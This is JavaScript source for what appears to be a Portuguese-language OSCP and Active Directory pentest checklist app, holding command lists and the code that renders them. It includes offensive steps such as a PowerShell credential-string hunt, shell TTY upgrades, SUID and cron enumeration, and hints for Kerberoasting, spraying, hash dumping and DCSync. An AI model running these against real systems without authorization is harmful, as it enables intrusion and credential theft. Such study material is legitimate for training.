        title: "BloodHound: checklist de anÃ¡lise",
        note: "NÃ£o Ã© coleta, Ã© o que vocÃª procura primeiro no grafo.",
        steps: [
          { title: "O que procurar primeiro", cmd: "Shortest Paths to Domain Admins\nUsers with Local Admin Rights\nKerberoastable / ASREPRoastable\nDCSync Rights\nInteresting ACLs (GenericAll/WriteDACL/WriteOwner)\nGPO abuse candidates" }
        ]
      },
      {
        title: "Troubleshooting rÃ¡pido",
        note: "Erros comuns que travam Kerberos e LDAP.",
        steps: [
          { title: "KRB_AP_ERR_SKEW (clock)", cmd: "sudo ntpdate -u {dc_ip} 2>/dev/null || true\ndate" },
          { title: "Cannot find KDC / DNS ruim", cmd: "dig +short {domain}\ndig +short _kerberos._tcp.{domain} SRV\ncat /etc/resolv.conf" },
          { title: "Formato de usuÃ¡rio", cmd: "Exemplos:\n{domain}\\\\{user}\n{user}@{domain}\n{domain}/{user}" }
        ]
      }

    ]
  }
];

const OSCP_STANDALONE_CHECKLIST = [
  {
    category: "Recon inicial e acesso",
    icon: "ðŸ§­",
    items: [
      {
        id: "recon_tcp_full",
        title: "Scan completo de todas as portas TCP",
        hint: "Full TCP primeiro, depois refine com -sV/-sC nas portas encontradas. Salve outputs.",
        cmd: "nmap -p- -Pn {ip} -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt"
      },
      {
        id: "recon_sv_sc",
        title: "Fingerprinting: serviÃ§os, versÃµes e scripts default",
        hint: "Rode -sV -sC, valide banner/headers, e confira cada porta TCP que apareceu no full scan.",
        cmd: "nmap -Pn {ip} -sV -sC -v -oN nmap_sVsC.txt"
      },
      {
        id: "recon_vuln_scripts",
        title: "Nmap vuln scripts (quando fizer sentido)",
        hint: "Use como apoio, nÃ£o como verdade absoluta. Cuidado em alvo instÃ¡vel.",
        cmd: "nmap -T5 -Pn {ip} -v --script vuln -oN nmap_vuln.txt"
      },
      {
        id: "recon_rustscan",
        title: "Rustscan (alternativa rÃ¡pida) â†’ Nmap",
        hint: "Ãštil quando vocÃª quer velocidade e ainda quer saÃ­da compatÃ­vel.",
        cmd: "rustscan --ulimit 5000 -a {ip} -- -sC -sV -Pn -oN nmap_full"
      },
      {
        id: "recon_web_enum_wordlists",
        title: "Enumerar web com wordlists relevantes",
        hint: "Dir + files + extensÃµes. Ajuste filtros (404, tamanho, regex) e faÃ§a recursÃ£o leve.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -recursion -recursion-depth 1",
          "ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 1",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -recursion -recursion-depth 1"
        ]
      },
      {
        id: "recon_fingerprint_full",
        title: "Fingerprinting completo do web/app",
        hint: "Wappalyzer, CMS, headers, robots, sitemap, versÃµes, endpoints, mÃ©todos e validaÃ§Ãµes.",
        cmds: [
          "curl -i {url}/",
          "curl -s {url}/robots.txt",
          "curl -s {url}/sitemap.xml"
        ]
      },
      {
        id: "recon_public_exploits",
        title: "Checar exploits pÃºblicos (Exploit-DB e Google)",
        hint: "Baseado em versÃ£o real confirmada. Busque tambÃ©m PoCs e bypasses.",
        cmds: [
          "searchsploit <software> <version>",
          "searchsploit -m <EDB-ID>"
        ]
      },
      {
        id: "recon_rescan_if_stuck",
        title: "Rescan e validaÃ§Ã£o quando travar",
        hint: "Se ficar preso, volte um passo: refaÃ§a full scan, confirme flags, confirme conectividade e hipÃ³teses."
      },
      {
        id: "recon_udp_top",
        title: "Checar UDP (top ports)",
        hint: "Nem sempre Ã© necessÃ¡rio, mas pode destravar serviÃ§os importantes.",
        cmd: "sudo nmap -sU --top-ports 200 {ip} -oN nmap_udp_top.txt"
      }
    ]
  },

  {
    category: "Web Content Discovery",
    icon: "ðŸŒ",
    items: [
      {
        id: "web_dirs",
        title: "Fuzz de diretÃ³rios (recursÃ£o leve)",
        hint: "Comece com dirs, depois files. Sempre ajuste filtro por status/tamanho.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -recursion -recursion-depth 1 -o dirs_common",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -recursion -recursion-depth 1 -o dirs_raft"
        ]
      },
      {
        id: "web_files",
        title: "Fuzz de arquivos (com extensÃµes)",
        hint: "Use extensÃµes alinhadas com a stack. Inclua txt/json/config quando fizer sentido.",
        cmds: [
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e php,html -o files_big",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -e php,asp,aspx,jsp,html,txt,json",
          "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 50 -e php,asp,aspx,jsp,html,txt,json"
        ]
      },
      {
        id: "web_parse_ffuf",
        title: "Parse do ffuf (jq) para revisar melhor",
        hint: "Ordene por status e URL para revisar rÃ¡pido.",
        cmds: [
          "cat dirs | jq -r '.results[] | [.status, .url] | @tsv' | sort",
          "cat files | jq -r '.results[] | [.status, .url] | @tsv' | sort"
        ]
      },
      {
        id: "web_wordlists",
        title: "Wordlists padrÃ£o (caminhos Ãºteis)",
        hint: "Tenha atalho mental de onde estÃ£o.",
        cmds: [
          "ls -la /usr/share/seclists/Discovery/Web-Content/common.txt",
          "ls -la /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/big.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt",
          "ls -la /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
        ]
      }
    ]
  },

  {
    category: "EstabilizaÃ§Ã£o de shell e enum em massa",
    icon: "ðŸ§¨",
    items: [
      {
        id: "sh_shells",
        title: "Checar shells disponÃ­veis",
        hint: "Ãštil para upgrades e compatibilidade.",
        cmd: "cat /etc/shells"
      },
      {
        id: "sh_ps1",
        title: "PS1 mais legÃ­vel (cores)",
        hint: "Melhora visibilidade e reduz erro bobo.",
        cmd: "PS1='\\[\\e[31m\\]\\u\\[\\e[96m\\]@\\[\\e[35m\\]\\H\\[\\e[0m\\]:\\[\\e[93m\\]\\w\\[\\e[0m\\]\\$ '"
      },
      {
        id: "sh_tty_upgrade",
        title: "Upgrade de TTY (python) + raw mode",
        hint: "PadrÃ£o clÃ¡ssico: spawn â†’ Ctrl+Z â†’ raw -echo â†’ fg â†’ ajustar rows/cols.",
        cmds: [
          "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
          "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
          "stty -a",
          "stty raw -echo; fg",
          "stty rows 29 cols 237",
          "export TERM=xterm-256color"
        ]
      },
      {
        id: "sh_mass_enum",
        title: "Mass enum (linpeas + lse) e logs",
        hint: "Salve output e revise com calma. Use less -R para cores.",
        cmds: [
          "/tmp/test/linpeas.sh | tee linpeas.log && /tmp/test/lse.sh -i | tee lse.log",
          "cat *.log",
          "less -R *.log"
        ]
      },
      {
        id: "sh_grab_files",
        title: "Puxar arquivos de enum via wget (quando aplicÃ¡vel)",
        hint: "Ajuda a baixar diretÃ³rio servido por HTTP simples.",
        cmds: [
          "wget -nH -r http://10.13.31.108/ && rm -f index.html",
          "chmod +x *.sh"
        ]
      }
    ]
  },

  {
    category: "Linux PrivEsc",
    icon: "ðŸ§",
    items: [
      {
        id: "lin_run_tools",
        title: "Rodar LinPEAS e (opcional) LSE",
        hint: "Isso normalmente entrega 80% do caminho. Salve output e revise devagar."
      },
      {
        id: "lin_sudo",
        title: "Checar sudo",
        hint: "Primeiro quick win. Olhe comandos, paths e variÃ¡veis.",
        cmd: "sudo -l"
      },
      {
        id: "lin_kernel",
        title: "Checar kernel e distro",
        hint: "Para hipÃ³teses de exploit e compatibilidade de payload.",
        cmds: [
          "uname -sr",
          "uname -a",
          "lsb_release -a 2>/dev/null",
          "cat /etc/os-release"
        ]
      },
      {
        id: "lin_suid_sgid",
        title: "Encontrar SUID/SGID e validar GTFOBins",
        hint: "Procure binÃ¡rios fora do comum. Use strings quando fizer sentido.",
        cmds: [
          "find / -type f -perm -04000 -ls 2>/dev/null",
          "find / -type f -perm -02000 -ls 2>/dev/null"
        ]
      },
      {
        id: "lin_cron",
        title: "Cronjobs e timers",
        hint: "Jobs como root e scripts gravÃ¡veis sÃ£o ouro.",
        cmds: [
          "cat /etc/crontab",
          "ls -la /etc/cron*",
          "cat /etc/cron* 2>/dev/null",
          "ls -la /etc/cron.d",
          "cat /var/spool/cron/* 2>/dev/null"
        ]
      },
      {
        id: "lin_process",
        title: "Processos e pspy",
        hint: "Observe jobs que rodam como root e scripts chamando paths relativos.",
        cmds: [
          "ps aux | grep root",
          "./pspy64"
        ]
      },
      {
        id: "lin_ports",
        title: "Portas internas abertas",
        hint: "Pode indicar serviÃ§os locais Ãºteis para privesc/pivot.",
        cmds: [
          "ss -lntu",
          "ss -ltu"
        ]
      },
      {
        id: "lin_group_user_files",
        title: "Writable por user/group",
        hint: "Procure diretÃ³rios e arquivos gravÃ¡veis fora do esperado.",
        cmds: [
          "id",
          "groups",
          "find / -writable -type d 2>/dev/null",
          "find / -writable -type f 2>/dev/null"
        ]
      },
      {
        id: "lin_caps",
        title: "Capabilities habilitadas",
        hint: "Algumas caps viram privesc direto.",
        cmd: "getcap -r / 2>/dev/null"
      }
    ]
  },

  {
    category: "Windows PrivEsc",
    icon: "ðŸªŸ",
    items: [
      {
        id: "win_run_tools",
        title: "Rodar enum: whoami /all â†’ PowerUp â†’ WinPEAS",
        hint: "Salve output e revise. Isso geralmente te dÃ¡ a trilha.",
        cmds: [
          "whoami /all",
          "systeminfo"
        ]
      },
      {
        id: "win_users_groups",
        title: "Users e grupos locais",
        hint: "Mapeie contexto e possÃ­veis rotas para privilÃ©gio.",
        cmds: [
          "net users",
          "net user <username>",
          "net localgroup",
          "net localgroup administrators",
          "qwinsta"
        ]
      },
      {
        id: "win_find_creds_fast",
        title: "Hunting rÃ¡pido por credenciais (PowerShell)",
        hint: "Filtre Windows e procure padrÃµes comuns em configs/logs/backup.",
        cmd:
"Get-ChildItem -Path C:\\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\\\Windows)' } | Select-String -Pattern \"pwd=\", \"password=\", \"username=\", \"user=\", \"pass=\""
      },
      {
        id: "win_patches",
        title: "Patch level",
        hint: "Ajuda em hipÃ³teses, embora OSCP geralmente foque mais em misconfig.",
        cmd: "wmic qfe get Caption,Description,HotFixID,InstalledOn"
      },
      {
        id: "win_netstat_pid",
        title: "ConexÃµes e PIDs",
        hint: "Ver serviÃ§os e pivÃ´s possÃ­veis.",
        cmd: "netstat -ano | findstr /vi UDP"
      },
      {
        id: "win_tasks",
        title: "Scheduled tasks",
        hint: "Tarefas com scripts gravÃ¡veis e paths ruins sÃ£o bons vetores.",
        cmds: [
          "schtasks",
          "schtasks /query /fo LIST /v"
        ]
      },
      {
        id: "win_services_paths",
        title: "ServiÃ§os suspeitos (paths e startmode)",
        hint: "Procure unquoted path, weak ACL, binÃ¡rio trocÃ¡vel, service misconfig.",
        cmds: [
          "wmic service get name,pathname,startmode,state | findstr /i 'c:' | findstr /i /v \"C:\\\\windows\\\\\"",
          "wmic service get name,pathname,startmode,state | findstr /i \"auto\" | findstr /i /v \"C:\\\\windows\\\\\"",
          "powershell -c \"Get-CimInstance -ClassName win32_service | Select Name,State,PathName\""
        ]
      }
    ]
  },

  {
    category: "FinalizaÃ§Ã£o",
    icon: "âœ…",
    items: [
      {
        id: "final_proofs",
        title: "Proofs coletadas",
        hint: "Local e proof. Validar prints e arquivo final."
      },
      {
        id: "final_notes",
        title: "AnotaÃ§Ãµes reprodutÃ­veis",
        hint: "Passo a passo claro, evidÃªncias, comandos exatos e decisÃµes."
      }
    ]
  }
];


const AD_CHECKLIST = [
  {
    category: "Recon & Baseline",
    icon: "ðŸ§­",
    items: [
      {
        id: "ad_recon_tcp_full",
        title: "Scan completo de todas as portas TCP",
        hint: "Full TCP primeiro, depois refine com -sV/-sC nas portas encontradas. Salve outputs."
      },
      {
        id: "ad_recon_udp_top",
        title: "Checar UDP (top ports) quando fizer sentido",
        hint: "DNS, Kerberos, SNMP podem aparecer. Use top ports e ajuste se descobrir algo."
      },
      {
        id: "ad_baseline_dc_domain",
        title: "Confirmar domÃ­nio, DC, DNS e clock",
        hint: "DomÃ­nio e DC IP corretos. Ajuste /etc/hosts se precisar. Em Kerberos, clock desalinhado quebra tudo."
      }
    ]
  },

  {
    category: "Enum sem credenciais",
    icon: "ðŸ•µï¸",
    items: [
      {
        id: "ad_anon_smb_ldap_rpc",
        title: "Testar SMB, LDAP e RPC com acesso anÃ´nimo",
        hint: "Ver se aceita null session, bind anÃ´nimo e enum bÃ¡sica. Checar shares pÃºblicos."
      },
      {
        id: "ad_enum_shares_anon",
        title: "Enumerar shares anÃ´nimos e permissÃµes",
        hint: "Se tiver leitura, procure: backups, scripts, GPP, arquivos com credenciais, chaves, configs."
      },
      {
        id: "ad_userlist_rid_brute",
        title: "Gerar lista de usuÃ¡rios por RID brute / lookupsid",
        hint: "OpÃ§Ãµes: netexec/crackmapexec rid-brute, impacket-lookupsid, rpcclient enumdomusers."
      },
      {
        id: "ad_userlist_kerbrute_userenum",
        title: "Validar usuÃ¡rios com kerbrute (userenum)",
        hint: "Se tiver lista, valide quem existe de verdade. Ajuda em ASREPRoast e spray."
      },
      {
        id: "ad_enum4linux_ng",
        title: "Rodar enum4linux-ng (e opcionalmente enum4linux clÃ¡ssico)",
        hint: "Pode achar polÃ­ticas, domÃ­nio, usuÃ¡rios, shares e mais. Ã€s vezes um encontra coisa que o outro nÃ£o."
      }
    ]
  },

  {
    category: "Kerberos Attacks",
    icon: "ðŸŽ«",
    items: [
      {
        id: "ad_asreproast",
        title: "ASREPRoast com lista de usuÃ¡rios",
        hint: "ApÃ³s ter usernames vÃ¡lidos. Se conseguir hashes AS-REP, tentar crack offline."
      },
      {
        id: "ad_kerberoast",
        title: "Kerberoast quando tiver user+senha",
        hint: "Com cred vÃ¡lida, enumerar SPNs e solicitar tickets. Crack offline e reutilizar credenciais."
      }
    ]
  },

  {
    category: "Credenciais: validaÃ§Ã£o e reuso",
    icon: "ðŸ”‘",
    items: [
      {
        id: "ad_auth_matrix",
        title: "Testar credencial em mÃºltiplos protocolos",
        hint: "Sempre que pegar user/senha ou hash: validar SMB, WinRM, RDP, LDAP, RPC, MSSQL e afins."
      },
      {
        id: "ad_shares_per_user",
        title: "Rechecar shares para cada novo usuÃ¡rio",
        hint: "Cada nova cred pode abrir share novo. RefaÃ§a enum de shares e permissÃµes."
      },
      {
        id: "ad_spray_protocols",
        title: "Bruteforce/spray controlado em protocolos relevantes",
        hint: "Respeite lockout policy. Prefira spray (1 senha em muitos users). Lembrar de NTLM quando aplicÃ¡vel."
      }
    ]
  },

  {
    category: "BloodHound & caminhos de ataque",
    icon: "ðŸ§ ",
    items: [
      {
        id: "ad_bh_collect",
        title: "Coletar BloodHound (quando tiver cred) e analisar paths",
        hint: "Procurar: caminhos de ACL/GPO, roasting, sessÃµes, DCSync, delegations e trusts."
      },
      {
        id: "ad_dcsync_check",
        title: "Checar possibilidade de DCSync",
        hint: "Se algum principal tem direito de replicaÃ§Ã£o. Se tiver, Ã© rota direta para domÃ­nio."
      }
    ]
  },

  {
    category: "AD CS (Certificados)",
    icon: "ðŸ“œ",
    items: [
      {
        id: "adcs_certipy",
        title: "Checar ataques de certificado (Certipy)",
        hint: "Procurar templates vulnerÃ¡veis e misconfigs (ESC*). Se tiver, pode virar domÃ­nio."
      }
    ]
  },

  {
    category: "Captura e relay de hashes",
    icon: "ðŸª¤",
    items: [
      {
        id: "ad_responder_early",
        title: "Considerar Responder cedo (quando fizer sentido)",
        hint: "Especialmente se existir share gravÃ¡vel, LLMNR/NBT-NS ativo ou cenÃ¡rio de coerÃ§Ã£o."
      },
      {
        id: "ad_writable_share_responder_path",
        title: "Checar se share gravÃ¡vel pode ajudar a capturar hashes",
        hint: "Share gravÃ¡vel pode virar caminho para coerÃ§Ã£o, atalhos, arquivos de configuraÃ§Ã£o, etc."
      }
    ]
  },

  {
    category: "PÃ³s-exploraÃ§Ã£o e movimento lateral",
    icon: "ðŸ§¨",
    items: [
      {
        id: "ad_post_shell_privesc",
        title: "Se obtiver shell: privesc + caÃ§a a credenciais",
        hint: "No host: configs, tokens, chaves, credenciais salvas, DPAPI, scripts, shares mapeados."
      },
      {
        id: "ad_dump_hashes",
        title: "Dump de hashes e coleta em arquivo",
        hint: "Guardar tudo: hashes e cred sets. Depois crack offline e tente reuso/lateral."
      },
      {
        id: "ad_lateral_exec",
        title: "Testar execuÃ§Ã£o remota conforme permissÃµes",
        hint: "Validar WinRM, RDP, psexec/wmiexec/smbexec e rpcclient. Cuidado com honeypots."
      }
    ]
  },

  {
    category: "Pivoting & rede interna",
    icon: "ðŸ•³ï¸",
    items: [
      {
        id: "ad_check_extra_nics",
        title: "Checar adaptadores de rede adicionais (pivot)",
        hint: "Se houver outra rede, montar pivot (chisel/ligolo/ssh) e rodar ferramentas via jumpbox."
      },
      {
        id: "ad_port_forward_need",
        title: "Checar portas locais/listening para port-forward",
        hint: "ServiÃ§os locais podem ser o caminho (DB interno, admin panel, etc.). Port-forward ajuda muito."
      }
    ]
  },

  {
    category: "Windows PrivEsc (quando cair em host Windows)",
    icon: "ðŸªŸ",
    items: [
      {
        id: "winpe_whoami_all",
        title: "Rodar whoami /all e salvar output",
        hint: "Base para entender grupos, privilÃ©gios e contexto."
      },
      {
        id: "winpe_tools",
        title: "Rodar PowerUp e WinPEAS, salvar output e revisar com calma",
        hint: "Isso costuma entregar a trilha. Se nÃ£o entregar, revisar enum manual e hipÃ³tese."
      },
      {
        id: "winpe_listening_ports",
        title: "Checar portas listening e conexÃµes",
        hint: "Pode indicar serviÃ§o Ãºtil, pivot ou tÃºnel."
      }
    ]
  },

  {
    category: "Rescue loop (quando travar)",
    icon: "ðŸ§¯",
    items: [
      {
        id: "ad_rescan_verify",
        title: "Re-scan e validar hipÃ³tese + ferramentas",
        hint: "RefaÃ§a full scan, confirme DNS/clock/rotas, revise o que jÃ¡ foi enumerado e o que faltou."
      },
      {
        id: "ad_recheck_manual_enum",
        title: "Revisar enum manual e procurar o Ã³bvio",
        hint: "Shares, polÃ­ticas, usuÃ¡rios, lockout, SPNs, endpoints expostos. Depois considerar brute controlado."
      }
    ]
  },

  {
    category: "ReferÃªncias Ãºteis",
    icon: "ðŸ“š",
    items: [
      {
        id: "ref_hacktricks_ad",
        title: "HackTricks: Active Directory Methodology",
        hint: "https://book.hacktricks.xyz/windows/active-directory-methodology"
      },
      {
        id: "ref_haax_kerberos",
        title: "Cheatsheet HaaX: Kerberos",
        hint: "https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/"
      },
      {
        id: "ref_tarlogic_kerberos",
        title: "Tarlogic: How to attack Kerberos",
        hint: "https://www.tarlogic.com/blog/how-to-attack-kerberos/"
      },
      {
        id: "ref_ad_attack_series",
        title: "YouTube: AD attack series (playlist)",
        hint: "https://www.youtube.com/playlist?list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk"
      },
      {
        id: "ref_winpeas",
        title: "winPEAS (PEASS-ng)",
        hint: "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
      },
      {
        id: "ref_powersploit",
        title: "PowerSploit (PowerUp etc.)",
        hint: "https://github.com/PowerShellMafia/PowerSploit.git"
      },
      {
        id: "ref_stealthbits",
        title: "Stealthbits AD Attack Catalog",
        hint: "https://attack.stealthbits.com/"
      },
      {
        id: "ref_enum4linux_ng",
        title: "enum4linux-ng",
        hint: "https://github.com/cddmp/enum4linux-ng"
      }
    ]
  }
];


function checklistKey(baseKey, slot) {
  return `${baseKey}_slot_${slot}`;
}

function loadChecklistState(baseKey, slot) {
  const key = checklistKey(baseKey, slot);
  const stored = loadJSON(key, null);

  if (stored && typeof stored === "object") {
    return {
      checked: stored.checked && typeof stored.checked === "object" ? stored.checked : {},
      open: stored.open && typeof stored.open === "object" ? stored.open : {},
      cmdOpen: stored.cmdOpen && typeof stored.cmdOpen === "object" ? stored.cmdOpen : {}
    };
  }
  return { checked: {}, open: {}, cmdOpen: {} };
}


function saveChecklistState(baseKey, slot, state) {
  const key = checklistKey(baseKey, slot);
  saveJSON(key, state);
}

function sectionProgress(def, state, section) {
  const ids = section.items.map(i => i.id);
  const done = ids.filter(id => !!state.checked[id]).length;
  return { done, total: ids.length };
}

function checklistToMarkdown(title, def, state) {
  const out = [];
  out.push(`# ${title}`);
  out.push("");

  def.forEach(sec => {
    out.push(`## ${sec.category}`);
    out.push("");

    sec.items.forEach(it => {
      const mark = state.checked[it.id] ? "x" : " ";
      out.push(`- [${mark}] ${it.title} (${it.id})`);

      if (it.hint) out.push(`  - ${it.hint}`);

      const cmds = [];
      if (it.cmd) cmds.push(it.cmd);
      if (Array.isArray(it.cmds)) cmds.push(...it.cmds);

      if (cmds.length) {
        out.push("");
        out.push("```bash");
        cmds.forEach(c => out.push(c));
        out.push("```");
      }
    });

    out.push("");
  });

  return out.join("\n");
}


function downloadText(filename, text, mime) {
  const blob = new Blob([text], { type: mime || "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

function renderChecklistInto(containerEl, def, baseKey, slot, titleForExport) {
  if (!containerEl) return;

  let state = loadChecklistState(baseKey, slot);
  containerEl.innerHTML = "";

  const base = getValues();
  const v = computeDerived(base);


  def.forEach(sec => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = state.open[sec.category] ? "true" : "false";
    section.dataset.accent = stableAccentKey(sec.category || "x");

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${sec.icon || "â€¢"}</span><span>${escapeHtml(sec.category)}</span>`;

    const prog = sectionProgress(def, state, sec);
    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${prog.done}/${prog.total}`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "â–¾";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = section.dataset.open === "true" ? "grid" : "none";

    const list = document.createElement("div");
    list.className = "oscpList";

    sec.items.forEach(it => {
      const row = document.createElement("div");
      row.className = "oscpRow";

      const isDone = !!state.checked[it.id];
      row.classList.toggle("done", isDone);

      const cb = document.createElement("input");
      cb.className = "oscpCheck";
      cb.type = "checkbox";
      cb.checked = isDone;

      const text = document.createElement("div");
      text.className = "oscpText";

      const t = document.createElement("div");
      t.className = "oscpTitle";
      t.textContent = it.title;
      text.appendChild(t);

      if (it.hint) {
        const h = document.createElement("div");
        h.className = "oscpHint";
        h.textContent = it.hint;
        text.appendChild(h);
      }

      const meta = document.createElement("div");
      meta.className = "oscpMeta";

      const pill = document.createElement("span");
      pill.className = "oscpPill";
      pill.textContent = it.id;

      meta.appendChild(pill);

      const cmds = [];
      if (it.cmd) cmds.push(it.cmd);
      if (Array.isArray(it.cmds)) cmds.push(...it.cmds);

      let cmdsWrap = null;

      if (cmds.length) {
        const isCmdOpen = !!state.cmdOpen[it.id];

        const btnToggleCmds = document.createElement("button");
        btnToggleCmds.className = "btn btnTiny";
        btnToggleCmds.type = "button";
        btnToggleCmds.textContent = isCmdOpen ? `Ocultar (${cmds.length})` : `Ver comandos (${cmds.length})`;

        meta.appendChild(btnToggleCmds);

        cmdsWrap = document.createElement("div");
        cmdsWrap.className = "checkCmds";
        cmdsWrap.style.marginLeft = "44px";
        cmdsWrap.style.marginTop = "10px";
        cmdsWrap.style.display = isCmdOpen ? "grid" : "none";
        cmdsWrap.style.gap = "10px";

        cmds.forEach((cmdStr, idx) => {
          const cmdPlain = renderCmdPlain(cmdStr, v);
          const cmdHtml = renderCmdHighlightedSafe(cmdStr, v);

          const card = document.createElement("div");
          card.className = "cmdCard";

          const top2 = document.createElement("div");
          top2.className = "cmdCardTop";

          const t2 = document.createElement("div");
          t2.className = "title";
          t2.textContent = cmds.length > 1 ? `Command ${idx + 1}` : "Command";

          const btn2 = document.createElement("button");
          btn2.className = "btn";
          btn2.textContent = "Copy";
          btn2.addEventListener("click", (e) => {
            e.stopPropagation();
            copy(cmdPlain);
          });

          top2.appendChild(t2);
          top2.appendChild(btn2);

          const code2 = document.createElement("div");
          code2.className = "code";
          applyCodeSpacingEl(code2);
          code2.innerHTML = toSpacedLinesHtml(cmdHtml);

          card.appendChild(top2);
          card.appendChild(code2);

          cmdsWrap.appendChild(card);
        });

        btnToggleCmds.addEventListener("click", (e) => {
          e.stopPropagation();
          const nowOpen = cmdsWrap.style.display === "none";
          cmdsWrap.style.display = nowOpen ? "grid" : "none";

          state.cmdOpen[it.id] = nowOpen;
          saveChecklistState(baseKey, slot, state);

          btnToggleCmds.textContent = nowOpen ? `Ocultar (${cmds.length})` : `Ver comandos (${cmds.length})`;
        });
      }


      cb.addEventListener("change", (e) => {
        state.checked[it.id] = e.target.checked;
        saveChecklistState(baseKey, slot, state);

        row.classList.toggle("done", e.target.checked);

        const p = sectionProgress(def, state, sec);
        badge.textContent = `${p.done}/${p.total}`;
      });

      row.appendChild(cb);
      row.appendChild(text);
      row.appendChild(meta);

      list.appendChild(row);
      if (cmdsWrap) list.appendChild(cmdsWrap);
    });

    body.appendChild(list);

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
      state.open[sec.category] = !isOpen;
      saveChecklistState(baseKey, slot, state);
    });

    section.appendChild(head);
    section.appendChild(body);

    containerEl.appendChild(section);
  });

  return {
    expandAll(open) {
      state = loadChecklistState(baseKey, slot);
      def.forEach(sec => { state.open[sec.category] = open; });
      saveChecklistState(baseKey, slot, state);
      renderChecklistInto(containerEl, def, baseKey, slot, titleForExport);
    },
    reset() {
      state = { checked: {}, open: {} };
      saveChecklistState(baseKey, slot, state);
      renderChecklistInto(containerEl, def, baseKey, slot, titleForExport);
    },
    exportMd(filenameBase) {
      state = loadChecklistState(baseKey, slot);
      const md = checklistToMarkdown(titleForExport, def, state);
      downloadText(filenameBase, md, "text/markdown;charset=utf-8");
    }
  };
}


function renderCheatsheet() {
  const prevOpen = snapshotOpenSections(els.cheatsContainer);

  const base = getValues();
  const v = computeDerived(base);

  els.cheatsContainer.innerHTML = "";

  CHEATS.forEach(group => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = "false";
    section.dataset.accent = stableAccentKey(group.category || "x");
    section.dataset.key = group.category || "";

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${group.icon}</span><span>${escapeHtml(group.category)}</span>`;

    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${group.items.length} blocks`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "â–¾";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = "none";

    if (group.note) {
      const n = document.createElement("div");
      n.className = "note";
      n.textContent = group.note;
      body.appendChild(n);
    }

    group.items.forEach(block => {
      const item = document.createElement("div");
      item.className = "item";
      item.dataset.open = "false";

      const itemHead = document.createElement("div");
      itemHead.className = "itemHead";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = block.title;

      const tag = document.createElement("span");
      tag.className = "tag";
      tag.textContent = group.category;
      name.appendChild(tag);

      const right = document.createElement("div");
      right.className = "row";

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy all";
      btn.addEventListener("click", (e) => {
        e.stopPropagation();
        const text = (block.steps || [])
          .map(s => renderCmdPlain(s.cmd, v))
          .join("\n\n");
        copy(text);
      });

      const itemChev = document.createElement("span");
      itemChev.className = "itemChev";
      itemChev.textContent = "â–¾";

      right.appendChild(btn);
      right.appendChild(itemChev);

      itemHead.appendChild(name);
      itemHead.appendChild(right);

      const innerWrap = document.createElement("div");
      innerWrap.style.display = "none";
      innerWrap.style.paddingBottom = "10px";

      if (block.note) {
        const n2 = document.createElement("div");
        n2.className = "note";
        n2.textContent = block.note;
        innerWrap.appendChild(n2);
      }

      (block.steps || []).forEach(step => {
        if (step.title) {
          const st = document.createElement("div");
          st.className = "stepTitle";
          st.textContent = step.title;
          innerWrap.appendChild(st);
        }

        const card = document.createElement("div");
        card.className = "cmdCard";

        const top2 = document.createElement("div");
        top2.className = "cmdCardTop";

        const t = document.createElement("div");
        t.className = "title";
        t.textContent = "Command";

        const btn2 = document.createElement("button");
        btn2.className = "btn";
        btn2.textContent = "Copy";
        btn2.addEventListener("click", (e) => {
          e.stopPropagation();
          copy(renderCmdPlain(step.cmd, v));
        });

        top2.appendChild(t);
        top2.appendChild(btn2);

        const code2 = document.createElement("div");
        code2.className = "code";
